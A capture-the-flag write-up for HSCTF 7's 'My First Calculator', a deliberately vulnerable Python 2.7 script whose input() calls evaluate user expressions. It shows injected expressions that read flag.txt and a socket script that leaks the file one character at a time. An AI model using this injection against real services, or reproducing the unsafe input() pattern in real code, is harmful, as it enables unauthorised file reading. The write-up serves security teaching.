# Table of Contents
1. [Author](#Author)
2. [CTF](#CTF)
3. [Category](#Category)
4. [Challenge Name](#Challenge-Name)
5. [Challenge Description](#Challenge-Description)
6. [Attachments](#Attachments)
7. [Challenge Points](#Challenge-Points)
8. [Solution](#Solution)
  1. [Code Analysis](#Code-Analysis)
  2. [Vulnerabilities](#Vulnerabilities)
  3. [Getting Our Hands Dirty](#Getting-Our-Hands-Dirty)

# Author
SamIsland

# CTF
HSCTF 7

# Category
Misc

# Challenge Name
My First Calculator

# Challenge Description
I’m really new to python. Please don’t break my calculator!
`nc misc.hsctf.com 7001`

There is a flag.txt on the server.

# Attachments

## calculator.py

``` python
#!/usr/bin/env python2.7
 
try:
    print("Welcome to my calculator!")
    print("You can add, subtract, multiply and divide some numbers")
 
    print("")
 
    first = int(input("First number: "))
    second = int(input("Second number: "))
 
    operation = str(raw_input("Operation (+ - * /): "))
 
    if first != 1 or second != 1:
        print("")
        print("Sorry, only the number 1 is supported")
 
    if first == 1 and second == 1 and operation == "+":
        print("1 + 1 = 2")
    if first == 1 and second == 1 and operation == "-":
        print("1 - 1 = 0")
    if first == 1 and second == 1 and operation == "*":
        print("1 * 1 = 1")
    if first == 1 and second == 1 and operation == "/":
        print("1 / 1 = 1")
    else:
        print(first + second)
except ValueError:
    pass
```

# Challenge Points
100 pts

# Solution
## Code Analysis:
After taking a first look at the source code we can see the script is written in python2.7 and calls a couple of `input()` methods casted as `int()` which expect us to pass two operands. After that, a `raw_input()` method is called, allowing us to pass in the operator.
At this point the script will run the calculation and output the result.

## Vulnerabilities:
In python2.x the `input()` method has a flaw that allows an attacker to pass in variable names, function names and any other data type. [Here](https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/) you can find more details about it.

## Getting our hands dirty:
Our goal is to read the flag written in the flag.txt file stored on the server BUT we have to keep in mind that both vulnerable inputs are casted as int, so in order not to make the program crash we can only pass in methods that return an integer.
So how can we get the flag if we can only work with integers?
The answer: by reading the decimal value of each character that composes the flag!

In order to make that happen, we first need to know the flag length.
To do that we connect to the server and pass in the following piece of code as the first input: 

`len(open('flag.txt', 'r').readline().split()[0])`

What it does is simply 
* opening the flag.txt file in reading mode
* reading its content
* splitting the content into a list
* selecting the first element of the list (the flag)
* returning its length

For the second input we pass 0 as we don’t want to mess up the length value,
and for the third one we can pass either ‘+’ or ‘-’

At this point the script will compute `FLAG_LENGTH ± 0`, printing out the actual flag length.

Now we are finally ready to read the flag!
We reconnect to the server and repeat the same procedure with a slightly different line of code:

`ord(open('flag.txt', 'r').readline()[n])`

It does pretty much the same thing as the one above, with the difference that this time we don’t need to get the whole string, so there’s no need to `strip()` it, and instead of calling `len()` we call `ord()` which returns the decimal value of the character at position n.

We still pass 0 and either `‘+’` or `’-’` to the next two inputs and we would get the decimal value of the Nth character of the flag.

All we have to do now is repeat this procedure for every character of the string.
It would take quite a lot of time to do that by hand, so i decided to automatize it with this simple script.

``` python
#!/usr/bin/python2
 
import socket
 
#Custom method to easily send the payload over the socket
def send(sock, payload):
    sent = False
 
    #Waiting for the first input request
    while not sent:
        data = sock.recv(1024)
        if "First" in data:
            #Sending the payload to the server
            sock.send(payload)
            sent = True
 
    sent = False
 
    #Waiting for the second input request
    while not sent:
        data = sock.recv(1024)
        if "Second" in data:
            #Sending 0 as second input
            sock.send("0\n")
            sent = True
 
    sent = False
 
    #Waiting for the third input request
    while not sent:
        data = sock.recv(1024)
        if "Operation" in data:
            #sending '+' as third input
            sock.send("+\n")
            sent = True
 
    #Waiting for the result to be calculated
    while "Sorry" not in data:
        data = s.recv(1024)
 
    #returning the result of the calculation
    return int(data[-4:-1])
 
if __name__ == "__main__":
 
    HOST = "misc.hsctf.com"
    PORT = 7001
 
    flag = ""
    FLAG_LEN = 0
    new_char = 0
 
    #Enstablishing connection with the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("misc.hsctf.com", 7001))
 
    #Finding the flag length so we can later initialize a loop
    #to get each flag characters
    if FLAG_LEN == 0:
        print("[*] Getting flag length...")
 
        #Sending the first code to get the flag length
        FLAG_LEN = send(s, "len(open('flag.txt', 'r').readline().split()[0])\n")
        print("[*] Got length: {}".format(FLAG_LEN))
 
        #Closing the server socket
        s.close()
 
    #Looping through each flag char
    for i in range(0, FLAG_LEN):
 
        #Enstablishing conneciton with the server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("misc.hsctf.com", 7001))
 
        #Sending the second code the get the ASCII value of the char at i position
        new_char = chr(send(s, "ord(open('flag.txt', 'r').readline()[{}])\n".format(i)))
        print("[*] Got char: {}".format(new_char))
 
        #Appending char to flag's string
        flag += new_char
 
        #Closing the server socket
        s.close()
 
    print(flag)
```

Once we run it, we wait a few seconds and we would get the flag:
`flag{please_use_python3}`

(It's fun since I wrote the script using python2 lmao)
